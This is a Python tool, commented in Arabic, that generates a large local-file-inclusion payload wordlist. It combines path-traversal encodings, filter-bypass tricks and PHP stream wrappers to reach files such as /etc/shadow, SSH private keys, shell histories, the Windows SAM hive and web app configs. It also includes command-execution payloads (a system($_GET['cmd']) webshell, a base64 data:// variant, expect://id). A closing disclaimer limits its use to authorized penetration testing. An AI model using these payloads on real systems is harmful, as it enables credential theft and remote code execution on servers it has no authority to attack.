import os
import argparse
import datetime
import random
import socket
import platform
from urllib.parse import quote, quote_plus

GREEN = "\033[32m"
RESET = "\033[0m"
PURPLE = "\033[35m"
INFO_BLUE = "\033[94m"
LIGHT_GREEN = "\033[92m"
LIGHT_RED = "\033[91m"
RED = "\033[31m"

a = """

░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓███████▓▒░       ░▒▓████████▓▒░  ░▒▓██████▓▒░   ░▒▓██████▓▒░  ░▒▓█▓▒░        ░▒▓████████▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░                 ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░                 ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓██████▓▒░   
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░          ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░          ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        
░▒▓████████▓▒░  ░▒▓██████▓▒░  ░▒▓███████▓▒░           ░▒▓█▓▒░      ░▒▓██████▓▒░   ░▒▓██████▓▒░  ░▒▓████████▓▒░ ░▒▓████████▓▒░ 
                                                                                                                              
"""

b = """

██╗     ██╗   ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██║     ██║   ██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██║     ██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     █████╗  
██║     ██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     ██╔══╝  
███████╗╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗███████╗
╚══════╝ ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                                        
"""

c = """

 ██▓     █    ██   ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓    ▓█████ 
▓██▒     ██  ▓██▒▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▓█   ▀ 
▒██░    ▓██  ▒██░░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ▒███   
▒██░    ▓▓█  ░██░  ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ▒▓█  ▄ 
░██████▒▒▒█████▓ ▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒░▒████▒
░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░░░ ▒░ ░
░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░ ░ ░  ░
  ░ ░    ░░░ ░ ░ ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░      ░   
    ░  ░   ░           ░                  ░ ░      ░ ░      ░  ░   ░  ░
                                                                       
"""

d = """

 ▄█       ███    █▄     ▄████████          ███      ▄██████▄   ▄██████▄   ▄█          ▄████████ 
███       ███    ███   ███    ███      ▀█████████▄ ███    ███ ███    ███ ███         ███    ███ 
███       ███    ███   ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███         ███    █▀  
███       ███    ███   ███                 ███   ▀ ███    ███ ███    ███ ███        ▄███▄▄▄     
███       ███    ███ ▀███████████          ███     ███    ███ ███    ███ ███       ▀▀███▀▀▀     
███       ███    ███          ███          ███     ███    ███ ███    ███ ███         ███    █▄  
███▌    ▄ ███    ███    ▄█    ███          ███     ███    ███ ███    ███ ███▌    ▄   ███    ███ 
█████▄▄██ ████████▀   ▄████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██   ██████████ 
▀                                                                        ▀                      

"""

def RAN():
    x = random.randint(100, 500)

    if x < 150:
        return random.choices([a, b, c], weights=[70, 25, 5])[0]

    elif 150 <= x < 250:
        return random.choices([b, a, c, d], weights=[60, 20, 15, 5])[0]

    elif 250 <= x < 400:
        return random.choices([c, d, b], weights=[65, 25, 10])[0]

    else:  # x >= 400
        return random.choices([d, c, b], weights=[70, 20, 10])[0]

class LFIPayloadGenerator:
    def __init__(self):
        self.timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_file = f"lfi_ultimate_payloads_{self.timestamp}.txt"
        
        # التكوين الأساسي
        self.max_depth = 4 #20 ملاحضة ممكن تغير هذا الرقم بشكل اختياري لأقصى عدد المسارات يعني عمق المسار لكن لا انصح بزيادتها عن اكثر من 4 مسارات
        self.enable_random_cases = True
        self.include_advanced_techniques = True
        self.include_os_specific = True
        
    def generate_payloads(self):
        """توليد قائمة شاملة من البوابات لاختبار ثغرات LFI"""
        
        # ملفات لينكس الحساسة
        linux_files = [
            # ملفات النظام الأساسية
            "etc/passwd", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname", "etc/issue",
            "etc/motd", "etc/shells", "etc/services", "etc/profile", "etc/fstab", "etc/mtab",
            "etc/resolv.conf", "etc/sudoers", "etc/crontab", "etc/inittab", "etc/modules",
            
            # ملفات تكوين الخوادم والخدمات
            "etc/apache2/apache2.conf", "etc/apache2/sites-available/000-default.conf",
            "etc/nginx/nginx.conf", "etc/nginx/sites-available/default",
            "etc/httpd/conf/httpd.conf", "etc/lighttpd/lighttpd.conf",
            "etc/mysql/my.cnf", "etc/mysql/mysql.conf.d/mysqld.cnf",
            "etc/postgresql/*/main/postgresql.conf", "etc/redis/redis.conf",
            "etc/mongodb.conf", "etc/memcached.conf", "etc/openldap/slapd.conf",
            "etc/ssh/sshd_config", "etc/vsftpd.conf", "etc/pure-ftpd.conf", "etc/proftpd.conf",
            "etc/fail2ban/jail.conf", "etc/iptables/rules.v4", "etc/squid/squid.conf",
            
            # ملفات السجلات
            "var/log/auth.log", "var/log/secure", "var/log/syslog", "var/log/messages",
            "var/log/apache2/access.log", "var/log/apache2/error.log",
            "var/log/nginx/access.log", "var/log/nginx/error.log",
            "var/log/httpd/access_log", "var/log/httpd/error_log",
            "var/log/mysql/mysql.log", "var/log/mysql/error.log",
            "var/log/postgresql/*.log", "var/log/mongodb/*.log",
            "var/log/auth.log.1", "var/log/daemon.log", "var/log/faillog", "var/log/kern.log",
            "var/log/lastlog", "var/log/mail.log", "var/log/user.log",
            
            # معلومات النظام والعمليات
            "proc/self/environ", "proc/self/cmdline", "proc/self/status", "proc/self/fd/0",
            "proc/self/fd/1", "proc/self/fd/2", "proc/self/fd/3", "proc/self/fd/4",
            "proc/version", "proc/cmdline", "proc/mounts", "proc/net/tcp", "proc/net/udp",
            "proc/self/maps", "proc/self/mem", "proc/self/stat", "proc/self/exe",
            "proc/sched_debug", "proc/net/arp", "proc/net/route", "proc/net/dev",
            "proc/cpuinfo", "proc/meminfo", "proc/partitions", "proc/1/environ",
            
            # ملفات تكوين البرامج والتطبيقات
            "etc/php/*/apache2/php.ini", "etc/php/*/cli/php.ini", "etc/php/*/fpm/php.ini",
            "etc/php.ini", "etc/php.d/*", "etc/php-fpm.conf", "etc/php-fpm.d/*",
            "usr/local/lib/php.ini", "usr/local/php/lib/php.ini",
            "etc/phpmyadmin/config.inc.php", "etc/mailman/mm_cfg.py",
            "etc/postfix/main.cf", "etc/dovecot/dovecot.conf", "etc/cups/cupsd.conf",
            "etc/bind/named.conf", "etc/dhcp/dhcpd.conf", "etc/snmp/snmpd.conf",
            
            # ملفات المستخدمين الحساسة
            "root/.ssh/id_rsa", "root/.ssh/authorized_keys", "root/.bash_history",
            "home/*/.ssh/id_rsa", "home/*/.ssh/authorized_keys", "home/*/.bash_history",
            "etc/pam.d/passwd", "etc/security/passwd", "var/backups/passwd.bak",
            "var/backups/shadow.bak", "var/backups/group.bak",
            
            # ملفات الويب
            "var/www/html/index.php", "var/www/html/wp-config.php", "var/www/html/config.php",
            "var/www/html/configuration.php", "var/www/html/config.inc.php",
            "var/www/html/connect.php", "var/www/html/database.php", "var/www/html/db.php",
            "var/www/html/settings.php", "var/www/html/constants.php", "var/www/html/local.php",
        ]
        
        # ملفات ويندوز الحساسة
        windows_files = [
            # ملفات النظام
            "windows/win.ini", "windows/system.ini", "boot.ini", "autoexec.bat", "config.sys",
            "windows/system32/drivers/etc/hosts", "windows/system32/config/SAM",
            "windows/system32/config/SYSTEM", "windows/system32/config/SOFTWARE",
            "windows/system32/config/SECURITY", "windows/repair/SAM", "windows/repair/SYSTEM",
            "windows/debug/NetSetup.log", "windows/iis.log", "windows/iis*.log",
            "windows/windowsupdate.log", "windows/system32/logfiles/httperr/*.log",
            
            # ملفات تكوين الخوادم
            "inetpub/wwwroot/web.config", "inetpub/wwwroot/global.asa",
            "Program Files/Apache Software Foundation/Apache*/conf/httpd.conf",
            "Program Files/Apache Software Foundation/Apache*/logs/access.log",
            "Program Files/Apache Software Foundation/Apache*/logs/error.log",
            "Program Files/MySQL/MySQL*/my.ini", "Program Files/Nginx/conf/nginx.conf",
            "Program Files/Nginx/logs/access.log", "Program Files/Nginx/logs/error.log",
            "Program Files/PHP/php.ini", "Program Files/PHP/7*/php.ini",
            
            # ملفات المستخدمين
            "Documents and Settings/Administrator/.bash_history",
            "Users/Administrator/.bash_history", "Users/Administrator/.ssh/id_rsa",
            "Users/*/AppData/Local/Temp/*", "Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
            "Users/*/AppData/Roaming/Microsoft/Windows/Recent/*",
        ]
        
        # تقنيات الوصول المباشر للملفات
        direct_techniques = [
            "../", "..%2f", "..%252f", "%2e%2e%2f", "%2e%2e/", "..%5c", "%2e%2e%5c",
            "..\\", "\\../", "....//", "....\\\\", ".././", "..../", "...//", ".../",
            "..../....//", ".%252e/", ".%2e/", "%c0%ae/", "0x2e0x2e/", "%uff0e%uff0e/",
            "..///", "../\\/", "..%c0%af", "%%32%65%%32%65/", "%e0%80%af",
            "%5c../", ".\\.\\", ".\\./", "//\\../", "/\\../", 
            "///\\.\\..///", "\\..\\..\\", "...\\\\//", "..\\/.\\", ".../\\/",
        ]
        
        # تقنيات للهروب من الفلتر
        filter_bypass = [
            "", "/%00", "//", "/./", "?", "#", "%20", "%09", ";", "%00index.php",
            "%0d", "%0a", "+", "//../", "/%2e/", "/%//", "/%2570", "././././",
        ]
        
        # بروتوكولات خاصة للاستغلال
        special_protocols = [
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=convert.base64-encode/resource=",
            "php://filter/resource=",
            "php://filter/zlib.deflate/convert.base64-encode/resource=",
            "php://filter/convert.iconv.utf-8.utf-16/resource=",
            "php://filter/convert.iconv.utf-8.utf-16le/resource=",
            "php://filter/convert.iconv.utf-16.utf-8/resource=",
            "php://filter/convert.quoted-printable-encode/resource=",
            "php://filter/string.rot13/resource=",
            "php://filter/string.toupper/resource=",
            "php://filter/string.tolower/resource=",
            "php://filter/convert.base64-decode/resource=",
            "php://input",
            "data://text/plain;base64,",
            "data://text/plain,",
            "expect://",
            "zip://",
            "phar://",
            "file://",
            "glob://",
            "compress.zlib://",
            "compress.bzip2://",
            "php://temp",
            "php://memory",
            "php://fd/",
        ]
        
        # تقنيات استغلال متقدمة
        advanced_techniques = [
            "php://filter/string.strip_tags/convert.base64-encode/resource=",
            "php://filter/convert.quoted-printable-encode/convert.iconv.utf-8.utf-16le/convert.base64-encode/resource=",
            "php://filter/read=convert.base64-decode|convert.base64-encode/resource=",
            "php://filter/convert.iconv.utf-8.us-ascii/resource=",
            "php://filter/convert.iconv.utf-8.utf-7/resource=",
            "php://filter/convert.base64-encode|convert.base64-decode/resource=",
            "php://filter/convert.base64-encode/convert.base64-decode/convert.base64-encode/resource=",
            "file:///var/www/html/",
            "file:///var/www/",
            "file:///etc/",
            "file:///proc/self/",
            "file:///../../../",
        ]
        
        # التطبيقات الشائعة والمعرضة للخطر
        vulnerable_apps = [
            "index.php", "wp-config.php", "configuration.php", "config.php", "config.inc.php",
            "settings.php", "connect.php", "db.php", "database.php", "setup.php",
            "admin.php", "admin/index.php", "admin/login.php", "admin/admin.php",
            "login.php", "register.php", "upload.php", "include.php", "functions.php",
            "function.php", "app.php", "inc.php", "api.php", "ajax.php", "common.php",
            "template.php", "cache.php", "main.php", "file.php", "test.php", "debug.php",
            "phpinfo.php", "info.php", "dev.php", "backup.php", "old.php", "new.php",
            "beta.php", "production.php", "staging.php", "local.php", "db-config.php",
            "system.php", "core.php", "init.php", "bootstrap.php", "autoload.php",
            "vendor/autoload.php", ".env", "config.yml", "config.json",
        ]

        
        
        # جمع كل الملفات
        all_files = linux_files.copy()
        if self.include_os_specific:
            all_files.extend(windows_files)
        
        with open(self.output_file, "w", encoding="utf-8") as f:
            # 1. توليد تقنيات التراجع المعيارية
            for technique in direct_techniques:
                for depth in range(1, self.max_depth + 1):
                    traversal = technique * depth
                    for target_file in all_files:
                        # استخدام حالات مختلفة للهروب من الفلتر
                        if self.enable_random_cases:
                            target_file_mixed = self._random_case(target_file)
                            f.write(f"{traversal}{target_file_mixed}\n")
                            
                        for bypass in filter_bypass:
                            path = f"{traversal}{target_file}{bypass}"
                            f.write(f"{path}\n")
                            
                            # أضف أيضًا نسخة مشفرة بـ URL
                            encoded_path = quote(path)
                            double_encoded_path = quote(encoded_path)
                            f.write(f"{encoded_path}\n")
                            f.write(f"{double_encoded_path}\n")
            
            # 2. توليد قائمة للبروتوكولات الخاصة
            for protocol in special_protocols:
                for app in vulnerable_apps:
                    payload = f"{protocol}{app}"
                    f.write(f"{payload}\n")
                    
                    # أضف أيضًا مسارات مختلفة
                    for depth in range(1, 5):
                        nested_path = "../" * depth + app
                        f.write(f"{protocol}{nested_path}\n")
            
            # 3. توليد تقنيات متقدمة
            if self.include_advanced_techniques:
                for technique in advanced_techniques:
                    for app in vulnerable_apps:
                        f.write(f"{technique}{app}\n")
                        
                # أضف تقنيات متقدمة مع اختلافات الترميز
                for depth in range(1, 10):
                    for app in vulnerable_apps:
                        mixed_protocol = random.choice(special_protocols)
                        mixed_traversal = random.choice(direct_techniques) * depth
                        mixed_bypass = random.choice(filter_bypass)
                        mixed_payload = f"{mixed_protocol}{mixed_traversal}{app}{mixed_bypass}"
                        f.write(f"{mixed_payload}\n")
                        
                # أضف بوابات عشوائية متعددة المستويات
                for _ in range(100):
                    protocols = random.choice(special_protocols)
                    traversal = random.choice(direct_techniques) * random.randint(1, 10)
                    target = random.choice(all_files)
                    bypass = random.choice(filter_bypass)
                    f.write(f"{protocols}{traversal}{target}{bypass}\n")
            
            # 4. توليد محاولات إضافية مخصصة
            custom_payloads = [
                # طرق مختلفة للترميز
                "/var/log/apache2/error.log%00",
                "/var/log/apache2/access.log%00",
                "/proc/self/environ%00",
                "../../../etc/passwd%00.html",
                "../../../etc/passwd%00.jpg",
                "../../../etc/passwd%00.png",
                "../../../etc/passwd%00.gif",
                "....//....//....//....//etc/passwd",
                "....\/....\/....\/....\/etc/passwd",
                
                # تقنيات الإلتفاف على mod_rewrite
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "%252e%252e%252fetc%252fpasswd",
                "%252e%252e%252fetc%252fpasswd%00",
                "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
                
                # جربات استغلال خبايا معينة
                "../../../proc/self/environ HTTP_USER_AGENT=<?system($_GET['cmd']);?>",
                "php://input<?php system($_GET['cmd']); ?>",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                "expect://id",
                
                # تقنيات للتغلب على الأمان
                "/etc/passwd/..",
                "/etc/passwd/....",
                "/etc/passwd/././././.",
                "../../../etc/passwd./../../../etc/passwd",
            ]
            
            for payload in custom_payloads:
                f.write(f"{payload}\n")
        
        # حساب عدد البوابات
        with open(self.output_file, 'r', encoding='utf-8') as f:
            total_lines = sum(1 for _ in f)
            
        return self.output_file, total_lines
    
    def _random_case(self, s):
        """تغيير الأحرف عشوائيًا بين كبيرة وصغيرة لتجاوز بعض الفلاتر"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

if __name__ == "__main__":
    print("\n" * 4)
    print("\n" + f"{GREEN}=" * 70)
    print(f"{PURPLE}{RAN()}")
    
    print(f"{GREEN} " * 20 + "LFI ULTIMATE PAYLOAD GENERATOR" + " " * 20)
    print("=" * 70 + "\n")
    
    print(f"{LIGHT_GREEN}[+] {GREEN}Starting advanced generation of LFI gateways list...")
    generator = LFIPayloadGenerator()
    output_file, total_payloads = generator.generate_payloads()
    
    print(f"{LIGHT_GREEN}[+] {GREEN}Created {total_payloads:,} gateway in the file: {output_file}")
    print(f"{LIGHT_GREEN}[+] {GREEN}Creation time: {generator.timestamp}")
    print(f"{LIGHT_GREEN}[+] {GREEN}Hostname: {socket.gethostname()}")
    print(f"{LIGHT_GREEN}[+] {GREEN}Operating system: {platform.system()} {platform.release()}")
    
    print(f"\n{LIGHT_RED}[!] {RED}Warning: This tool is intended for authorized penetration testing purposes only.")
    print(f"{LIGHT_RED}[!] {RED}Using this tool on systems that are not authorized for testing may be illegal.")
    print(f"{GREEN}\n" + "=" * 70)